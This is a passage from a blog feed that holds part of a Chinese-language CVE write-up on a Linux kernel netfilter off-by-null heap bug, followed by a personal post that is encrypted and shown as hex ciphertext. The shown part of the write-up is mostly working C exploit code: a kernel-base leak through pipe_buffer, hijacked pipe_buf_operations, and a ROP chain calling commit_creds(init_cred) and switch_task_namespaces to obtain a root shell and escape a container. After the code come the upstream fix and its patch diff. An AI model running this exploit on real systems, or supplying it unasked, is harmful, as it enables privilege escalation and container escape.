class="string">&quot;arttnba3&quot;</span>, <span class="number">8</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to write the pipe!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// release the sk_buff to read pipe_buffer, leak kernel base</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] release sk_buff to read pipe_buffer...&quot;</span>);</span><br><span class="line">    pipe_buf_ptr = (<span class="keyword">struct</span> pipe_buffer *) &amp;fake_secondary_msg;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (read(sk_sockets[i][<span class="number">1</span>], &amp;fake_secondary_msg, </span><br><span class="line">                    <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">                errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (pipe_buf_ptr-&gt;ops &gt; <span class="number">0xffffffff81000000</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] got anon_pipe_buf_ops: \033[0m%llx\n&quot;</span>, </span><br><span class="line">                        pipe_buf_ptr-&gt;ops);</span><br><span class="line">                kernel_offset = pipe_buf_ptr-&gt;ops - ANON_PIPE_BUF_OPS;</span><br><span class="line">                kernel_base = <span class="number">0xffffffff81000000</span> + kernel_offset;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] kernel base: \033[0m%llx \033[32m\033[1moffset: \033[0m%llx\n&quot;</span>, </span><br><span class="line">            kernel_base, kernel_offset);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.V</span></span><br><span class="line"><span class="comment">     * hijack the ops of pipe_buffer</span></span><br><span class="line"><span class="comment">     * free all pipe to trigger fake ptr</span></span><br><span class="line"><span class="comment">     * so that we hijack the RIP</span></span><br><span class="line"><span class="comment">     * construct a ROP on pipe_buffer</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.V hijack the ops of pipe_buffer, gain root privilege\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] pre-construct data in userspace...&quot;</span>);</span><br><span class="line">    pipe_buf_ptr = (<span class="keyword">struct</span> pipe_buffer *) fake_secondary_msg;</span><br><span class="line">    pipe_buf_ptr-&gt;ops = victim_addr;</span><br><span class="line"></span><br><span class="line">    ops_ptr = (<span class="keyword">struct</span> pipe_buf_operations *) fake_secondary_msg;</span><br><span class="line">    ops_ptr-&gt;release = <span class="number">0xffffffff8183b4d3</span> + kernel_offset;<span class="comment">// push rsi ; pop rsp ; add [rbp-0x3d],bl ; ret</span></span><br><span class="line">    ops_ptr-&gt;confirm = <span class="number">0xffffffff81689ea4</span> + kernel_offset;<span class="comment">// pop rdx ; pop r13 ; pop rbp ; ret</span></span><br><span class="line"></span><br><span class="line">    rop_idx = <span class="number">0</span>;</span><br><span class="line">    rop_chain = (<span class="type">uint64_t</span>*) &amp;fake_secondary_msg[<span class="number">0x20</span>];</span><br><span class="line">    <span class="comment">// switch to namespace init_nsproxy</span></span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + POP_RDI_RET;</span><br><span class="line">    rop_chain[rop_idx++] = <span class="number">1</span>;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + FIND_TASK_BY_VPID;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + PUSH_RAX_POP_RDI_RET;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + POP_RSI_RET;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + INIT_PROXY;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + SWITCH_TASK_NAMESPACES;</span><br><span class="line">    <span class="comment">// gain root privilege and return to userspace</span></span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + POP_RDI_RET;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + INIT_CRED;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + COMMIT_CREDS;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="number">22</span>;</span><br><span class="line">    rop_chain[rop_idx++] = *(<span class="type">uint64_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    rop_chain[rop_idx++] = *(<span class="type">uint64_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    rop_chain[rop_idx++] = getRootShell;</span><br><span class="line">    rop_chain[rop_idx++] = user_cs;</span><br><span class="line">    rop_chain[rop_idx++] = user_eflags;</span><br><span class="line">    rop_chain[rop_idx++] = user_sp;</span><br><span class="line">    rop_chain[rop_idx++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray sk_buff to hijack pipe_buffer...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] trigger fake ops-&gt;release to hijack RIP...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        close(pipe_fd[i][<span class="number">0</span>]);</span><br><span class="line">        close(pipe_fd[i][<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="0x03-漏洞修复"><a href="#0x03-漏洞修复" class="headerlink" title="0x03.漏洞修复"></a>0x03.漏洞修复</h1><p>内核主线在 <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=b29c457a6511435960115c0f548c4360d5f4801d">这个 commit</a> 中完成了对该漏洞的修复，主要就是<strong>取消掉对 pad 置 0 的这一操作</strong>，而是选择在 <code>translate_compat_table()</code> 中进行预先的置 0，从而避免了为了将 pad 区域置 0 而导致的堆上 off-by-null，笔者个人认为这个方案还算是比较成功的</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/net/ipv4/netfilter/arp_tables.c b/net/ipv4/netfilter/arp_tables.c</span></span><br><span class="line"><span class="comment">index 6c26533480dd1..d6d45d820d79a 100644</span></span><br><span class="line"><span class="comment">--- a/net/ipv4/netfilter/arp_tables.c</span></span><br><span class="line"><span class="comment">+++ b/net/ipv4/netfilter/arp_tables.c</span></span><br><span class="line"><span class="meta">@@ -1193,6 +1193,8 @@</span> static int translate_compat_table(struct net *net,</span><br><span class="line"> if (!newinfo)</span><br><span class="line"> goto out_unlock;</span><br><span class="line"> </span><br><span class="line"><span class="addition">+memset(newinfo-&gt;entries, 0, size);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"> newinfo-&gt;number = compatr-&gt;num_entries;</span><br><span class="line"> for (i = 0; i &lt; NF_ARP_NUMHOOKS; i++) &#123;</span><br><span class="line"> newinfo-&gt;hook_entry[i] = compatr-&gt;hook_entry[i];</span><br><span class="line"><span class="comment">diff --git a/net/ipv4/netfilter/ip_tables.c b/net/ipv4/netfilter/ip_tables.c</span></span><br><span class="line"><span class="comment">index f15bc21d73016..f77ea0dbe6562 100644</span></span><br><span class="line"><span class="comment">--- a/net/ipv4/netfilter/ip_tables.c</span></span><br><span class="line"><span class="comment">+++ b/net/ipv4/netfilter/ip_tables.c</span></span><br><span class="line"><span class="meta">@@ -1428,6 +1428,8 @@</span> translate_compat_table(struct net *net,</span><br><span class="line"> if (!newinfo)</span><br><span class="line"> goto out_unlock;</span><br><span class="line"> </span><br><span class="line"><span class="addition">+memset(newinfo-&gt;entries, 0, size);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"> newinfo-&gt;number = compatr-&gt;num_entries;</span><br><span class="line"> for (i = 0; i &lt; NF_INET_NUMHOOKS; i++) &#123;</span><br><span class="line"> newinfo-&gt;hook_entry[i] = compatr-&gt;hook_entry[i];</span><br><span class="line"><span class="comment">diff --git a/net/ipv6/netfilter/ip6_tables.c b/net/ipv6/netfilter/ip6_tables.c</span></span><br><span class="line"><span class="comment">index 2e2119bfcf137..eb2b5404806c6 100644</span></span><br><span class="line"><span class="comment">--- a/net/ipv6/netfilter/ip6_tables.c</span></span><br><span class="line"><span class="comment">+++ b/net/ipv6/netfilter/ip6_tables.c</span></span><br><span class="line"><span class="meta">@@ -1443,6 +1443,8 @@</span> translate_compat_table(struct net *net,</span><br><span class="line"> if (!newinfo)</span><br><span class="line"> goto out_unlock;</span><br><span class="line"> </span><br><span class="line"><span class="addition">+memset(newinfo-&gt;entries, 0, size);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"> newinfo-&gt;number = compatr-&gt;num_entries;</span><br><span class="line"> for (i = 0; i &lt; NF_INET_NUMHOOKS; i++) &#123;</span><br><span class="line"> newinfo-&gt;hook_entry[i] = compatr-&gt;hook_entry[i];</span><br><span class="line"><span class="comment">diff --git a/net/netfilter/x_tables.c b/net/netfilter/x_tables.c</span></span><br><span class="line"><span class="comment">index 6bd31a7a27fc5..92e9d4ebc5e8d 100644</span></span><br><span class="line"><span class="comment">--- a/net/netfilter/x_tables.c</span></span><br><span class="line"><span class="comment">+++ b/net/netfilter/x_tables.c</span></span><br><span class="line"><span class="meta">@@ -733,7 +733,7 @@</span> void xt_compat_match_from_user(struct xt_entry_match *m, void **dstptr,</span><br><span class="line"> &#123;</span><br><span class="line"> const struct xt_match *match = m-&gt;u.kernel.match;</span><br><span class="line"> struct compat_xt_entry_match *cm = (struct compat_xt_entry_match *)m;</span><br><span class="line"><span class="deletion">-int pad, off = xt_compat_match_offset(match);</span></span><br><span class="line"><span class="addition">+int off = xt_compat_match_offset(match);</span></span><br><span class="line"> u_int16_t msize = cm-&gt;u.user.match_size;</span><br><span class="line"> char name[sizeof(m-&gt;u.user.name)];</span><br><span class="line"> </span><br><span class="line"><span class="meta">@@ -743,9 +743,6 @@</span> void xt_compat_match_from_user(struct xt_entry_match *m, void **dstptr,</span><br><span class="line"> match-&gt;compat_from_user(m-&gt;data, cm-&gt;data);</span><br><span class="line"> else</span><br><span class="line"> memcpy(m-&gt;data, cm-&gt;data, msize - sizeof(*cm));</span><br><span class="line"><span class="deletion">-pad = XT_ALIGN(match-&gt;matchsize) - match-&gt;matchsize;</span></span><br><span class="line"><span class="deletion">-if (pad &gt; 0)</span></span><br><span class="line"><span class="deletion">-memset(m-&gt;data + match-&gt;matchsize, 0, pad);</span></span><br><span class="line"> </span><br><span class="line"> msize += off;</span><br><span class="line"> m-&gt;u.user.match_size = msize;</span><br><span class="line"><span class="meta">@@ -1116,7 +1113,7 @@</span> void xt_compat_target_from_user(struct xt_entry_target *t, void **dstptr,</span><br><span class="line"> &#123;</span><br><span class="line"> const struct xt_target *target = t-&gt;u.kernel.target;</span><br><span class="line"> struct compat_xt_entry_target *ct = (struct compat_xt_entry_target *)t;</span><br><span class="line"><span class="deletion">-int pad, off = xt_compat_target_offset(target);</span></span><br><span class="line"><span class="addition">+int off = xt_compat_target_offset(target);</span></span><br><span class="line"> u_int16_t tsize = ct-&gt;u.user.target_size;</span><br><span class="line"> char name[sizeof(t-&gt;u.user.name)];</span><br><span class="line"> </span><br><span class="line"><span class="meta">@@ -1126,9 +1123,6 @@</span> void xt_compat_target_from_user(struct xt_entry_target *t, void **dstptr,</span><br><span class="line"> target-&gt;compat_from_user(t-&gt;data, ct-&gt;data);</span><br><span class="line"> else</span><br><span class="line"> memcpy(t-&gt;data, ct-&gt;data, tsize - sizeof(*ct));</span><br><span class="line"><span class="deletion">-pad = XT_ALIGN(target-&gt;targetsize) - target-&gt;targetsize;</span></span><br><span class="line"><span class="deletion">-if (pad &gt; 0)</span></span><br><span class="line"><span class="deletion">-memset(t-&gt;data + target-&gt;targetsize, 0, pad);</span></span><br><span class="line"> </span><br><span class="line"> tsize += off;</span><br><span class="line"> t-&gt;u.user.target_size = tsize;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;del&gt;喷子永远是版本答案&lt;/del&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CVE" scheme="http://blog.arttnba3.cn/categories/CVE/"/>
    
    
    <category term="Pwn" scheme="http://blog.arttnba3.cn/tags/Pwn/"/>
    
    <category term="CVE" scheme="http://blog.arttnba3.cn/tags/CVE/"/>
    
    <category term="Linux" scheme="http://blog.arttnba3.cn/tags/Linux/"/>
    
    <category term="提权" scheme="http://blog.arttnba3.cn/tags/%E6%8F%90%E6%9D%83/"/>
    
    <category term="Linux Kernel" scheme="http://blog.arttnba3.cn/tags/Linux-Kernel/"/>
    
    <category term="容器逃逸" scheme="http://blog.arttnba3.cn/tags/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/"/>
    
  </entry>
  
  <entry>
    <title>【PIECES.0x03】Shell之外的往事：一桶凉泡面</title>
    <link href="http://blog.arttnba3.cn/2022/03/18/PIECES-0X03-SHELL_OUTSIDE-3-IDEALIST_DEATH/"/>
    <id>http://blog.arttnba3.cn/2022/03/18/PIECES-0X03-SHELL_OUTSIDE-3-IDEALIST_DEATH/</id>
    <published>2022-03-17T20:14:40.000Z</published>
    <updated>2022-07-03T18:28:21.164Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="链接：https://pan.baidu.com/s/1glFilTF8ua6hI-bklKgJXw 提取码：cth0" data-whm="还请不要做一些奇奇怪怪的事情！">  <script id="hbeData" type="hbeData" data-hmacdigest="021a53f82f4d0a53a326dbabae58ecbff5caf1dcda21cbc8c2c71e6d35e1c32e">eef143a3a3e51e2ee0b1e9c84de8c53cc91e34a664716adcbae4109613b0f512e4f2191695bdd8ebd253d7aea5fb72fb7441e7a0c717919bf2d685be72be9f75bb229fefdf00a1d50c05f54dbeda18476fada873faa1e8f0c1d3c2642d134e0a72e5a53d997a9032eb55059b45dfb74dba53660fe60ac68b74c2aa55b7ce3c50484d8455ea294d03d5755991cdb4132a5dba9f709d6c439731c890785e495760e97a0f5cf91d9be2870847bab8af5cb042d628a9bee60fd37d9055e0371856feda62e72612729a1820936cc6d2dcbc15197de145db589df683e7ffa92c6120c0edea38d3f6e6b1a11027580f0c233d8217ad1bd07bad12bf0291bde16123b044a5839d34cc384be04d0442fc9f602ace513f3660bc7b28958fbcdc347b83b8e4bcaa472b64eb5b98ac96d15e8f7b0cf6cac705978ae2070a788c06981ad3d2cb860e7dbdef2dcf704a72f141487a58dda00bcc72c7a6070184cb2bfcda276baf56b941d38a3db0a30e54774de12be79d2c7ed1e46ef7bd2c9c2b80af1ccda49baa66c85eef85487154785cde4d4fb3d2b1ee3999c1641722ef19c07541e5e7097c69ca99998d796c5151e63f7d9b8ab5c66946f9301c754cdea3bfab6f94d20b24d5f57010e3003202b51891df9580119ffaed608e0a5cc56621ef8802e884efacd595e4eb5a06b9ffd6cb48fae2cdefd4054a6b829d198e38aa159080ba75783a9e806024d54994b6bd3a5b7536d4b9408dda28a4b75420fba0e4521945e538cabb9a6f7229eeacf32334e1265a849464609d4af9ed4cd748dbb7fa72111d0a056b3bea351dc4544f7f7937a169c8a8d13c1f2664b4d0c084ee77a7c26f37569eea4e226bff7a5daea2f9acdab3efb03c252f539b8ac6820d6ee5f23fcac3544a2b58dbaec0e91e6bbe7054db5a2b473ed4ce14441e0a79c3cc17f6475bd9d1bced6235f4b9983a0f8dc7bca224cad782444363302a9687697c6a1cb298993bf3709988f72cad5417d18879304479c3e3f710e41255a1b3855bac6b5a74451d7189f9ebe8592674b8b631c9a066168999e820a47d8ec45d6c428c7917ce272c67e84d4e880f45255c924f1ec19ae023b9fbe7e51e3f0c0d70a9b19ede74e7e46223f2cb50a47bdee12e6ca2c4036fb67b141a3511adcc785592f6ace64aedd34a126a52364d6c770ba2ea14ac07c3e68b2b45bd77df2de268eee62ae1d29e79d8e9798ebda99c4c70326da1bf430f8ef813851a6fb9c753712160c097e513980eafab10c3e63fc2a748286956ce3f271f2d9f64a02c7edddd34241a92a41810794e8a28ba3be385c9e9a54562e6e22193ad53381ba1512d3c35e3bb5e38ebe89e7c35d65e86209a224b453eb22c4208c6fae5051ec32d5a3331be3163d21fe1c6d787c05316ebffaa5a6bdaf1278aaebceb0dbdcddc85d259386b553c93491dba7bfd182cedaed31b7d3c7b38f104cd2097ea63970d0580e5abe327a6efe0fa40539856c5974ac182f944c7df952e4204cfe1076f46af9d18da06aa8e3be966c4f69e10c12a3eec3935f7301de0708f0bdab19011b138f023cd6b14196a937d583c5b520b8e08c69c6a1dd58188b08250df5f2f21b97828a497ba4085a3d4dbd05266938b4bbcbd4895c8bf335400b757eccbdfc0be8213effcb68a5df107414da1aae7c0c3a2ea93e09fa4414a2d4ca04a51eacf849aa4484d999e43c1e4c7bfa6e8479dca6a6c9cd2a2fd0cb85eb8402a58267b6fae056c4bdf112fd8b80a2db2f647c68237bee2cdd98ddac77f5a49316ed172cd8a6b49214c3bdcf48cace48f43bd5fe68615b5788ca4fcb866596ae601b683ccf17308896bfae3b03623614a7abe3542cd2a381eec948ee60a7d60c673444f7fde3615429376fcb9e7ba9bfad601e8938b74fabe1d1f7769cd9d09f2b92ecb2b2dedb1c65c4a116f231127b295096143fb4c5cba421fb3169720c5a93209e2018366e37b2ef2299af60577e118430cb0aebc1fcebd53ffbc8603e6570c2d74f1fbefbedba21514f1e85910b9087ab0730aab56fd3344b499505fbfde4ca1a58917a92fb687f5f5bb89a3717ceaae2b91bef950e813a219ce23a1b099d55f4d534ca93df6799cba47036f1a2cea6368a095f8152e9832cf97edd6be7392242f044f5aed2a062ece3a87fa48cdae902c0ad3d7395f2bc6998f34616ac6b221c249f38c172380df1c994b08b6e7be4b4b67aafe3e5085e7e13ad3ca9e60761f4b624ce19168dba2fbd0606b04638004044e38a239a1dcf31346230256f2e69d067c25cd0bfe69d3ee95fa8e07a0eec24394b030b8b1cb1affd424a0e217b3a58fc667c33ced6d476fe18cb397d0716af7e316f63e0091aa0f3b61e5c51f7361b3ae312f5b5b4b4e98f42726454a5f3e0f344c7c86f0e96ab2ef2eb9d2047f29581c1aeba2ad3a8f0c6a1b5cc46b4a3132ac48bb2856c441930e14c642cb424262fb0e0217d43950adeafae0983fdd6901599593fbfc0144dbf51ee22d25570c58070273dc1a44daffce60ddb0105f476d2c7ad19e7926b5d55426e57f680a176ca359856e44a0434c02eb53a6506bf3ea8fb34f56cc44b58204c86363175da82b4af652b27c38d42c62d8d91a4076056fbd41811217599b60d0891286be3dc4d35d8c4490a07caaf348c70a10f96d32f5a1d5430bce1c4f9b27098260d62e1170c4235ccf85b44d0953785033722979baad48f267243f924f5b3fe137700cfe7edb97f87875ad00d1ac40e0d22dd776176e6179ef55f807c6910a05ecaab85e62fd39447732d8ef6716168f521149c7155a642b2d70ebd0425c7aa75259f735b4b3a066fbaa360b72b3dfdeef0f90ffacd6a7a73bffd8e09ad591c4351d0fe690090175c20d1678a270c0e836ec795d8e8be48def1ece83606d1d4091f24582f55b171335bcba7472d0f965ce0a2a9ff355cec243b918d08199519de26ada6747ab0f3e7114937b6d85219da1db83d4baf3b20843214360a4aa4e4ae6fbbd870af67383f4b3cf43438005f9cf2aad2d58a02513df3a1e26f073165ced0ea9d21b446659833b4a13713f903c40e78aaf712c8b0d5a7393cc48c61d1cfc995cbdab3b2221d6fbdf66d9e240b0714ec8ed47334bacaeafe75c9371c613b36355ab54e7677f6f60c57111ae371942a407640ed9059e15490cae1471e6ae61feaaf5725c17cbf9cb6b6797a2fe58de81af37936d395383927aa3421c2b11480f7518fe52e9d917e820d3075bd0c890577e0a94813a61fc58aad4954dc4e455be7d8d174d9ddfe1670f8eaffef937ff44083bf4ce896caf1299aabc3358f49a994970b6ae2709feed2bfee682e62592334c06b8bdee852d0fa0e3855d4c0a0b3bbf03ff7b0b79ca63be326051ca0e85297b279447ae51e9781696c5c8b3968c0a5a392dd11f97f5a40cea9016dab58534d848e02e7cc5dd4ca13708345d8fb2b192d149e4b1978cda66f1d13c71136b2aefff0ca7f6f1a9bb3bd8a974c39b8f46b1399688c4964fc293afea1f6dd8aa9fffca897b540b956e2e7b4c7780bd280f1cb075e0997667a7bf6ee0b789c1beaa21df05b2762292a266f5787655d4d6e81cf39ec9175d9805ef2f18f638318ba2f38513d9773edbdbe46da05905a6cd1618e9cfd86d0261434b86549fb32e85a5b0bc3ac7b5bebfa3814f26e50dd1c324f4d586982ef399f698b191980c2847c865b2a99373d845e13ec26ba637469d5c8bb2dc46ec70d798bc6239d61378c26e70e6a559559b61e738d05aafdaf608ee3c4322a1627bad8cffd694ea426a752e20e18ad068e7d0fbfe5cb33b345059c8cf2544ff00f6c679feb77ed0bef4fa1109760e47cd2d0fbe21f3c5240e91a0b1ebb5f60c83549187c5d6ed491aef4dae010d5c5ab5db5480a68896ecce1582e5f401fd1bd425f8056bb2d603fae40064a9c2df1117683da722b2ac0fab4caf97f0ac6eda5c87ebfb69b29c5b7a53ffa255b4206dcefa6f035e25cfcff6d3109d7c936b1c99ddfbfff84d6efcb9022775af383791325a72bdf3c19a4766dcc47ba559cb0ea5aa89f21fe70b3ab1074b5c66e7f7fe7077800c1e8a41d6913f615e3fc0f56b1fd44b7a4ee3f92bc1b41e598507e2c7e2b74763809c3edc892f492346bdc8844dc96191f5a57ecf5c9bf6a0a61cb623a6f827414951d349334d9c3073c95274923563ec80117331e711ebdb97716404b88fb478041aedee0354aed9bcc1572a4d8b9236d0dd7b2ccea3a3e596f8daa496ed850a15d6e9641139fd0a75bfe66fe0a4f39a956a5f324ea820613b3969bc78f60ca15fb066f0589e6f12dfdaebab61aef2f22e8b086f148c504fd3676b6b6b5e8ba81088c044cf93fc21cc16fd19518b64e0787098f93e7cb7ffe1b580563a1b34e280787406b12569149a2f198808ee0d6483ac14031376783e409a192228a6620820742d4c1bd14823fd589eb4fa22b686c0d61efb3685d5488c5a6cefbdde112ad8d0325f1dd00dc3ff5b78fba9f251e7ecd1850813e0a68e14616220042d7fde8aa714034406fe542856f49d53c274cefd7f4637239a339ad9272a31ed93d094b227bc1eeccfee46b270aa61a7968c5b20f80832b2b8f49e6556dc5085ddc14cfc51175dd42314c0d659b81efcab91f1ae0112706f95737eb5d99815e53c920a5e9c8416a1e45d5b24727df42844996f87ebfd4bd2ba719b46fb36e0704454ebf8938f5079e1375b96dc61fca34e7827f53b5a22e5cef2a6203542cfcddfad2dd72e6575512206f53ed434e1171e3ef675bca25e579804ee94468cc0dfa893cbfd767ae872998c3273d296078617f9c27023796f9b9f62bf71ca2b79b004bcf920559ff957b5200a8fb0d2160b1102a5ba3773189959cced97cd94a1e6e6076bf6079c6f9613ba6509095758e82e7d3eba976a41fa4f5d02730d93631f54a88b1a01316dbc69fcc14ca9332418afcea33ad91934a0188cc8eb89749721ef2ab7c2919a80016418c4b753324fe762a6ba7fb18487a5246dc1900737de4cdcd2660eed2c69f313f43e338667eb3a90a087c3698312466aa339596210e75a149a6f92d26501b2071f7e13c88eb1cd0eaac84bd8a44bec27580cde0512cd9ea0119e046d7a25766dff02eb235fd026813b3488430b19baaa747f85e641fedeef54f49415ea9d82c556d26f7ea345fb610d2efe45b5659119a0c9f9e96e2341ccba9c235b1e6de1b074c0b64c9fc6fb5e0d7e72f5dcd187c15002b03e87694e05bd4a5d739c6c5655491a86bb8c7c3ed5b632220589db51d7a4f1ac8c68600a6f99b60dbbb8aa1a2d97bdef479717895f62f3ac28499c5aea3e41c10ce3fe66b5e23020c69d406a7d4ac5ccc66878484f2446dabb3a54e98530dfa1940ec242be18d276e3b04ef540d2343379adeaab00aa81e6a72e7470911026d4b30382e946f729d2c2ae5b45870395d100b8bdd86ff681796569604f6dff38922f5c014b2f4d2c442218dd5ced5200fb8709339c8c49795cd8ba08fc5eebab5685a5636d524c5428b7bd8e2f5bf3e9a246d89095400d46745af6dbc9243ce599bd32200d713da69293d044b46941afd463c8a78396653fab112b4ff82d450148ee74b06e27c4aadf533a54c935618dcc3aae5ef41c84a5a82b648315f118bcfe0840b1df70d82c6b033d8f3d8f0ec8ef41fb60974393c7b3ed57feb9607a3439f99b3f0c0739ab4b28ce77a1b415f601cfe41c85fc3ac8fe997e8dd0acf54596dc62929bc61beb310a5d0c930010a8e2c88c5385b17a0f0ed68c4403d4262c860c590caf539d606d72e19f5f74904c15c4a551fbe205767c8fee753e0cc05bfe64dc6c0aaf6ba2d20f99307ad81009b0b35f63f729045b434266e4154fdd5a3f243e657580306036589b85ef95ac77c5e6f834d0fef9060cc5a2a3a90bba46961e9e16266854dbae23bec56f80e36d544558622c536cf02bf4f36230af85d356fdacb0b349e4542c892b18086744a896db7a3656bdd43ab16c086c60d8a8eb9a60408afa923aea3aec98d4814ff7a28e64a9f6f892e778442842afbdd7b2e2fc771fc5bfec2a7150e90d4047831cac65f5950b25edac2229122cf98d521956c255270322c3a33bc3eac12c4904281d29afddba4d8996cea6bdd586735d5cc0be4b358a1e5e369f8e518d1e19305293d50a18c2b8ece01c89d40a83333843abe3c86ba09df1a446c77d5c5a5e47a0ae2ced39eee35537e71a8c668dc11c8b3c5010bf711b040cee59bf0851848155711fe8a1f3b004654fad25d9b00d7a7dd419a2403e26c1522b7c7c3d3d1ff882f3752dcff157c5bc043fa5c4a868f5a2ac2106b8a568cac7ac13217cff87f08217681fe99417923199ba1b4c547a5396bdd152f7591151d96752aac9fae00631140f260266e55ef86ee647c77fc6e55cc1459e301116cdf0616bc301b6a55dcda5b32fa64db3d628bf4373f51699c9114d3d4ef9cc540d98340c83c18d78974f6d4465aa74e541178b4a8ee067e9e49d3d7ee5e274371952feeba5a23bdaaf90218da50ea22d4ddd7f15e7f4fa33fc37c3fd4679f1bffd22e8b93ed5dc2e1b37e4d7c4cca5502092d908dbba2febcb89c71b44625497d62e793c64b8b1a2a8141540a384a36b5ec0a023e6c5f0f63003c268ab7ed05fd22aa91bcbd0d2301d1d0be47e3afc1c30e379ac48e621e541b9b86f72337a0e7a9adf5ba701f4dcdfd454b7246e9888e7f2b71dd0f48df2954cf182935606e1406ed4d7cc0db0b40127216a0b816c348311340efedb209784e8c592971858ddc4289207157aa95b8b6d2c2a7bf977b6c08c2ac9e30571e1c30ca79ed132d9db65ed246de08829cf2ff8e35a2c5d24a0f421f4784cfff63399b6f284ea6e23591859da56d5905d265223f5c3ac05044d7a035a4685441321f7aa2b2f9297e9c4b24b03c48a5fcca8c001ea95d5b55a610287ba284f28ffc43b898a6f9f06e3185ab67ccd32091bfe7dad47bfd70fba676ee069c9600c4ce3c9fb1492c6e842caa8a042681333381f3d171d79c51f57e4d68aa9e7ee83decf5204f833bd6a56327104c0f09f64f44048eea3d144c927dde9b3b1796df1b624bdfe2033fc14366563ffa23b2b173c2529818e6238ae12e351aeb9fd8f370a7e864037785683cc33a20be757130bb447adb80bbc4ba38854b7d188a984faa7e060c136de7071b6371875e0bb5ae3dd1efe2554d91888d945edfa45f6fd21736781f6fa1eff033635809fce8090accdb57d6efadd4cc274e1fb4daeef2dc0ada